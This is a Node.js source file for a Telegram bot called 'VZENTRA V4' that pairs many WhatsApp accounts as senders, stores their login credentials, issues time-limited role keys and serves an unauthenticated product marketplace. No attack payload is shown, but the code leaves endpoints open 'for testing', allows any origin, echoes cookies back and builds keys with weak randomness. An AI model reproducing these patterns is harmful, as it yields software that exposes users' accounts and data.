const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay,
encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;

function getCountryCode(phoneNumber) {
    const countryCodes = {
        '1': 'US/Canada',
        '44': 'UK',
        '33': 'France',
        '49': 'Germany',
        '39': 'Italy',
        '34': 'Spain',
        '7': 'Russia',
        '81': 'Japan',
        '82': 'South Korea',
        '86': 'China',
        '91': 'India',
        '62': 'Indonesia',
        '60': 'Malaysia',
        '63': 'Philippines',
        '66': 'Thailand',
        '84': 'Vietnam',
        '65': 'Singapore',
        '61': 'Australia',
        '64': 'New Zealand',
        '55': 'Brazil',
        '52': 'Mexico',
        '57': 'Colombia',
        '51': 'Peru',
        '58': 'Venezuela',
        '27': 'South Africa'
    };

    for (const [code, country] of Object.entries(countryCodes)) {
        if (phoneNumber.startsWith(code)) {
            return country;
        }
    }
    
    return 'International';
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    // Pastikan direktori database ada
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    // Pastikan setiap user punya role default 'user' jika tidak ada
    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    // Tulis file dengan format yang rapi
    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅  Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true; // ✅ Kembalikan true jika sukses
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false; // ✅ Kembalikan false jika gagal
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  
  // Jika file tidak ada, buat file kosong
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }
  
  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    
    // Handle file kosong
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }
    
    const users = JSON.parse(fileContent);
    
    // Pastikan setiap user punya role
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);
    
    // Jika file corrupt, buat backup dan reset
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }
    
    // Reset file dengan array kosong
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");
    
    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}
app.get("/tools", (req, res) => {
    res.sendFile(path.join(__dirname, "INDICTIVE", "tools.html"));
});
app.get("/opsi", (req, res) => {
    res.sendFile(path.join(__dirname, "INDICTIVE", "opsi.html"));
});
// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  // Check hasil setelah 30 detik
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

// FUNCTION SANGAT SIMPLE
function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      // Cek apakah session files ada
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    // Kirim event connecting
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    // ✅ GUNAKAN LOGGER YANG SILENT
    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          // ❌ HAPUS DARI sessions MAP KETIKA TERPUTUS
          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          // ✅ SIMPAN SOCKET KE sessions MAP GLOBAL - INI YANG PENTING!
          sessions.set(BotNumber, userSock);
          
          // ✅ KIRIM EVENT SUCCESS KE WEB
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          // ✅ SIMPAN KE USER SESSIONS
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          // Generate pairing code jika belum ada credentials
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            // Tunggu sebentar sebelum request pairing code
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                // KIRIM KODE PAIRING KE WEB INTERFACE
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        // Tampilkan QR code jika ada
        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      // Timeout after 120 seconds
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};
app.get("/product-admin", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "product-admin.html");
  res.sendFile(filePath);
});
// Mengambil username dari cookie "sessionUser" seperti sistem Anda
function getCurrentUsername() {
  const cookies = document.cookie.split(';');
  for (const cookie of cookies) {
    const [name, value] = cookie.trim().split('=');
    if (name === 'sessionUser') {
      return value;
    }
  }
  return 'guest';
}

// ==================== PRODUCTS SYSTEM ==================== //

// ==================== PRODUCTS SYSTEM (NO AUTH FOR TESTING) ==================== //

const productsPath = path.join(__dirname, "products.json");

// Load products
function loadProducts() {
  if (!fs.existsSync(productsPath)) {
    const initialData = { products: [] };
    fs.writeFileSync(productsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    return JSON.parse(fs.readFileSync(productsPath, "utf8"));
  } catch (error) {
    console.error("❌ Error loading products:", error);
    return { products: [] };
  }
}

// Save products
function saveProducts(data) {
  try {
    fs.writeFileSync(productsPath, JSON.stringify(data, null, 2));
    console.log("✅ Products saved");
    return true;
  } catch (error) {
    console.error("❌ Error saving products:", error);
    return false;
  }
}

// SIMPLE AUTH CHECK (no middleware)
function simpleAuthCheck(req) {
  // Parse cookie manually
  if (req.headers.cookie) {
    const cookies = {};
    req.headers.cookie.split(';').forEach(cookie => {
      const parts = cookie.trim().split('=');
      if (parts.length >= 2) {
        cookies[parts[0]] = decodeURIComponent(parts.slice(1).join('='));
      }
    });
    return cookies.sessionUser;
  }
  return null;
}

// API: Get all products (PUBLIC - no auth required)
app.get("/api/products", (req, res) => {
  try {
    const data = loadProducts();
    res.json({ success: true, products: data.products });
  } catch (error) {
    res.json({ success: false, error: "Gagal memuat produk" });
  }
});

// API: Add product (SIMPLE AUTH)
// API: Add product dengan penanganan error yang lebih baik
// API: Add product - SIMPLE VERSION
app.post("/api/products/add", (req, res) => {
  console.log('📦 [ADD PRODUCT] === START ===');
  
  // Debug langsung
  console.log('📦 Headers:', JSON.stringify(req.headers, null, 2));
  console.log('📦 Raw body:', req.body);
  console.log('📦 Body type:', typeof req.body);
  
  // Fix 1: Jika body undefined, coba parse manual
  if (!req.body) {
    console.log('⚠️  Body is undefined, trying to read raw data');
    let data = '';
    req.on('data', chunk => {
      data += chunk.toString();
    });
    req.on('end', () => {
      console.log('📦 Raw data received:', data);
      try {
        const parsedData = JSON.parse(data);
        processProductData(parsedData, res);
      } catch (e) {
        console.error('❌ Failed to parse JSON:', e.message);
        res.json({ 
          success: false, 
          error: "Invalid JSON format",
          rawData: data.substring(0, 100) 
        });
      }
    });
    return;
  }
  
  // Fix 2: Jika body ada, proses langsung
  processProductData(req.body, res);
});

// Function untuk proses data produk
function processProductData(productData, res) {
  console.log('📦 Processing product data:', productData);
  
  // Validasi minimal
  if (!productData || !productData.title || !productData.price) {
    console.log('❌ Missing required fields');
    return res.json({ 
      success: false, 
      error: "Data tidak lengkap",
      required: ["title", "price"],
      received: productData 
    });
  }
  
  try {
    // Load existing products
    const data = loadProducts();
    
    // Generate ID
    const productId = Date.now().toString();
    
    // Create new product object
    const newProduct = {
      id: productId,
      title: String(productData.title || '').trim(),
      description: String(productData.description || '').trim(),
      price: String(productData.price || '').trim(),
      photoUrl: String(productData.photoUrl || '').trim(),
      telegramUsername: String(productData.telegramUsername || '').trim(),
      telegramLink: String(productData.telegramLink || '').trim(),
      addedBy: "guest", // Temporary, tanpa username
      timestamp: new Date().toISOString()
    };
    
    // Add to array
    data.products.unshift(newProduct);
    
    // Save
    const saved = saveProducts(data);
    
    if (saved) {
      console.log(`✅ Product added: ${newProduct.title}`);
      return res.json({ 
        success: true, 
        message: "Produk berhasil ditambahkan",
        product: newProduct
      });
    } else {
      return res.json({ 
        success: false, 
        error: "Gagal menyimpan produk" 
      });
    }
    
  } catch (error) {
    console.error("❌ Error:", error);
    return res.json({ 
      success: false, 
      error: "System error: " + error.message 
    });
  }
}
// Route untuk marketplace (PUBLIC)
app.get("/marketplace", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "marketplace.html");
  res.sendFile(filePath);
});

// Route untuk tambah produk (PUBLIC VIEW, auth di client side)
app.get("/add-product", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "add-product.html");
  res.sendFile(filePath);
});

// Test route untuk set cookie
app.get("/set-cookie-test", (req, res) => {
  res.setHeader('Set-Cookie', 'testCookie=working; Path=/');
  res.send('Cookie set. Check with /check-cookie');
});

app.get("/check-cookie", (req, res) => {
  res.json({ 
    cookies: req.cookies,
    headers: req.headers.cookie,
    parsed: req.cookies?.testCookie 
  });
});

// Route untuk halaman marketplace
app.get("/marketplace", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "marketplace.html");
  res.sendFile(filePath);
});

// Route untuk halaman admin produk
app.get("/product-admin", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "product-admin.html");
  res.sendFile(filePath);
});
bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🍁 VZENTRA V4</blockquote>
<i>Now Pikachu has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @Ghanz626</b>
<b>Version   :  V1</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    // Baris 1
    ["🔑 Settings Menu"],
    // Baris 2  
    ["ℹ️ Bot Info", "💬 Chat"],
    // Baris 3
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Settings Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 vzentraV4</blockquote>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("INFORMASI", "https://t.me/xhunders") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>vzentraV4</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @Ghanz626 for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("INFORMASI", "https://t.me/xhunders") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/Ghanz626");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/xhunders");
});

// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 vzentra V4</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("INFORMASI", "https://t.me/xhunders") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>vzentra V4</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @Ghanz626 for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("INFORMASI", "https://t.me/xhunders") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  
  const teks = `
<blockquote>🍁 vzentra</blockquote>
<i>Now Pikachu has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @Ghanz626</b>
<b>Version   : V2</b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Settings Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<role>\n\nContoh:\n• /ckey indictive,3d,admin\n• /ckey user1,7d,reseller\n• /ckey user2,1d,user\n\nRole: owner, admin, reseller, user");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  // Validasi role
  const validRoles = ['owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("myrole", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }
  
  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Gunakan /ckey di bot untuk membuat key dengan role tertentu (Owner only)</i>
  `, { parse_mode: "HTML" });
});

/* simpen aja dlu soalnya ga guna
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

